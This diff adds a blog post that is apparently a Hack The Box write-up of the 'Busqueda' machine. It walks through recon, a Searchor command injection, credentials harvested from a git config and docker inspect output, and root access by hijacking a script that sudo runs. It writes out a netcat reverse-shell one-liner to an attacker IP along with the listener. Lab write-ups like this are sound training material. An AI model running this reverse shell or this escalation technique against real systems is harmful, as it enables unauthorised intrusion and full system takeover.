@@ -1,0 +1,358 @@
+---
+layout: /src/layouts/PostLayout.astro
+title: Busqueda
+tags: []
+---
+**Start 11:20 21-08**
+
+---
+```
+10.10.11.208
+```
+
+## Recon
+
+==Nmap==
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.11.208
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-21 05:22 EDT
+Nmap scan report for 10.10.11.208
+Host is up (0.043s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sT -sV 10.10.11.208
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-21 05:23 EDT
+Nmap scan report for 10.10.11.208
+Host is up (0.052s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.15 seconds
+```
+
+Looks like we got a host called `searcher.htb`, let's add it to our `/etc/hosts` file.
+
+```bash
+# /etc/hosts
+10.10.11.208    searcher.htb
+```
+
+I then went on to the website to check what I could find.
+
+## 80/TCP - HTTP
+
+After heading to the website I was greeted with this page:
+
+![](../../../assets/37eb6b8c12ff08921bc5d15fd93885a9.png)
+
+Down at the bottom we find some other details, such as the site being powered by `Flask`, a `python web app framework` and `Searchor 2.4.0` which we will check for exploits:
+
+![](../../../assets/df45da5da5d8c1e98d48926691d66e50.png)
+
+==Exploit==
+After looking up vulnerabilities for `Searchor 2.4.0` I found a couple of which I tried [this one first](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection). This is a `Command Injection vulnerability`:
+
+The `Proof of Concept` is pretty straightforward:
+
+![](../../../assets/aab1c7fa939b7f689766992ba1f08526.png)
+
+I proceeded to try it out myself
+
+![](../../../assets/84f3445b3011cb995875f6b4774bf06c.png)
+
+And we're in, easy as that. Here I was able to get the `user.txt` fairly easily by heading into `/home/svc`.
+
+## Flags 
+
+==user.txt==
+```bash
+svc@busqueda:~$ cat user.txt
+cat user.txt
+de28a8710e0c34667ec742dd7704587f
+```
+
+==root.txt==
+Now onto some privilege escalation. I was not allowed to run `sudo -l` as seen below so I had to resort to other ways.
+
+```bash
+svc@busqueda:~$ sudo -l
+sudo -l
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+```
+
+After checking the `OS info` I found nothing worth exploiting, so instead I went to take a look at the `/var/www/app/.git` folder which has an interesting `config` file which I took a look at.
+
+```bash
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+```
+
+We find some new info, we found a user called `cody` together with a password `jh1usoih2bkjaspwe92`, and a subdomain called `gitea.searcher.htb` which I added to my `/etc/hosts` file.
+
+After adding the `subdomain` I headed to the site and proceeded to login with the previously found creds.
+
+![](../../../assets/d8ac9da1a041168a0e999837ed583e5f.png)
+
+I did not find anything which we could use right now so I instead went to login to `SSH` as the `svc` user with the previously found password. Here I could run `sudo -l` since I now had the password.
+
+![](../../../assets/e7d4008413b31c2d34a89ae8c2114706.png)
+
+We see that we are allowed to run a python script in the `/opt/scripts` folder as `root`.
+Unfortunately enough we can not view the contents as the file is still owned by root, so I decided to run the file instead to see what `params` it takes:
+
+```bash
+sudo python3 /opt/scripts/system-checkup.py *
+```
+
+![](../../../assets/d35037f3553a31bb0f6002358c48245f.png)
+
+It appears to be script checking various `containers` and/or the whole system. I ran the `docker-ps` option and it gave me this output:
+
+```bash
+svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS          PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   19 months ago   Up 50 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   19 months ago   Up 50 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+```
+
+We see that there is a `docker` container running `MySQL` on port `33060` as well as the `gitea` container. Other than that we should try the other commands now. 
+
+I tried the `full-checkup` command but that just did not work for some reason:
+
+```bash
+svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup 
+Something went wrong
+```
+
+Then last but not least I tried the `docker-inspect` command.
+
+```bash
+svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect
+Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
+```
+
+We know the `container_name` param, but we do not know what they mean by `format`. I decided to look it up and found relevant info [here]([docker inspect | Docker Docs](https://docs.docker.com/reference/cli/docker/inspect/)). 
+
+![](../../../assets/a4f0afffd937bb7cac29e3aabfd04c0e.png)
+
+It seems we can just specify the `json` format with the `-f` flag and be on our way, let's see:
+
+```bash
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
+```
+
+Above we specify the `jq` after the pipe in order to output it as a parsed `json` file. By default `jq` should already be installed on the target machine, so no further action is necessary.
+
+This gives us a massive output. Most of this stuff does not mean anything to us except for the `ENV` tab which shows the following:
+
+```json
+    "Env": [
+      "USER_UID=115",
+      "USER_GID=121",
+      "GITEA__database__DB_TYPE=mysql",
+      "GITEA__database__HOST=db:3306",
+      "GITEA__database__NAME=gitea",
+      "GITEA__database__USER=gitea",
+      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
+      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",                                      
+      "USER=git",
+      "GITEA_CUSTOM=/data/gitea"
+    ],
+```
+
+Here we have actually found some `hardcoded credentials` for the `MySQL` database. We can now log into the website as the `administrator` with the given creds. 
+
+![](../../../assets/6a4548b938ddef3f83f11be244c8eca4.png)
+
+Now that we are in as `administrator` we can check out the `/scripts` folder and check the `system-checkup.py` script what it exactly does.
+
+```python
+#!/bin/bash
+import subprocess
+import sys
+
+actions = ['full-checkup', 'docker-ps','docker-inspect']
+
+def run_command(arg_list):
+    r = subprocess.run(arg_list, capture_output=True)
+    if r.stderr:
+        output = r.stderr.decode()
+    else:
+        output = r.stdout.decode()
+
+    return output
+
+
+def process_action(action):
+    if action == 'docker-inspect':
+        try:
+            _format = sys.argv[2]
+            if len(_format) == 0:
+                print(f"Format can't be empty")
+                exit(1)
+            container = sys.argv[3]
+            arg_list = ['docker', 'inspect', '--format', _format, container]
+            print(run_command(arg_list)) 
+        
+        except IndexError:
+            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
+            exit(1)
+    
+        except Exception as e:
+            print('Something went wrong')
+            exit(1)
+    
+    elif action == 'docker-ps':
+        try:
+            arg_list = ['docker', 'ps']
+            print(run_command(arg_list)) 
+        
+        except:
+            print('Something went wrong')
+            exit(1)
+
+    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+        except:
+            print('Something went wrong')
+            exit(1)
+            
+
+if __name__ == '__main__':
+
+    try:
+        action = sys.argv[1]
+        if action in actions:
+            process_action(action)
+        else:
+            raise IndexError
+
+    except IndexError:
+        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
+        print('')
+        print('     docker-ps     : List running docker containers')
+        print('     docker-inspect : Inpect a certain docker container')
+        print('     full-checkup  : Run a full system checkup')
+        print('')
+        exit(1)
+```
+
+Here I found why the `full-checkup` command was failing, it appears that the script previously failed simply because we were not in the same directory as the `./full-checkup.sh` script. 
+I moved on over to the correct folder and then proceeded to run the command again.
+
+```bash
+svc@busqueda:~$ find / -type f -name "full-checkup.sh" 2>/dev/null
+/opt/scripts/full-checkup.sh
+svc@busqueda:~$ cd /opt/scripts/
+```
+
+```bash
+svc@busqueda:/opt/scripts$ sudo python3 /opt/scripts/system-checkup.py full-checkup 
+[=] Docker conteainers
+{
+  "/gitea": "running"
+}
+{
+  "/mysql_db": "running"
+}
+
+[=] Docker port mappings
+{
+  "22/tcp": [
+    {
+      "HostIp": "127.0.0.1",
+      "HostPort": "222"
+    }
+  ],
+  "3000/tcp": [
+    {
+      "HostIp": "127.0.0.1",
+      "HostPort": "3000"
+    }
+  ]
+}
+
+[=] Apache webhosts
+[+] searcher.htb is up
+[+] gitea.searcher.htb is up
+
+[=] PM2 processes
+┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
+│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
+├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
+│ 0   │ app    │ default     │ N/A     │ fork    │ 1637     │ 82m    │ 0    │ online    │ 0%       │ 30.1mb   │ svc      │ disabled │
+└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
+
+[+] Done!
+```
+
+The output itself is actually not that important, but rather the function call is interesting. We now understand that in order to run `full-checkup` it is leveraging another script called `full-checkup.sh`. Using this logic we can create our own malicious script with the same name, but in another directory such as the `/tmp` folder where we have `write` access. 
+
+So we `cd` to `/tmp` and start writing our `reverse-shell` script. The script will be a `one-liner` in order to make execution smoother: 
+
+```bash
+echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 9001 >/tmp/f" > /tmp/full-checkup.sh
+```
+
+Make the script executable.
+
+```bash
+chmod +x full-checkup.sh
+```
+
+We turn on our listener.
+
+```bash
+nc -lvnp 9001
+```
+
+And then we simply run the script again:
+
+![](../../../assets/c8619459b734306d78d868f0be332c35.png)
+
+We can now get the `root` flag:
+
+```bash
+cd /root && cat root.txt
+4826eddc6ecf6f8ba69c83efe2b8c330
+```
+
+
+![](../../../assets/58e3fea49fcfcd5886285b37e9820690.png)
+
+---
+
+**Finished 12:54 21-08**
+
+[^Links]: [[Hack The Box]] [[OSCP Prep]]
